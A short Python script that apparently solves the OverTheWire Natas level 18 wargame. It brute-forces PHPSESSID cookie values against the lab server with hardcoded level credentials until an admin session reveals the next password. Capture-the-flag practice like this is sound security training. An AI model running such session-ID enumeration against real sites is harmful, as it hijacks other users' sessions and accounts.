#!/usr/bin/python

import requests
import re

natas18_user = 'natas18'
natas18_pass = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

target_base_url = 'http://natas18.natas.labs.overthewire.org/?username=admin&password=dummy"'

def make_post(session_id):
    # print(url)
    cookies = dict(PHPSESSID=str(session_id))
    r = requests.get(target_base_url, auth=(natas18_user, natas18_pass), cookies=cookies)
    pwd = re.search('Password: (.+?)</pre>', r.content)
    if pwd:
        print("Password found: " + pwd.group(1))
        return True
    return False

for i in range(0, 641):
    print("ID: " + str(i))
    if make_post(i):
        break
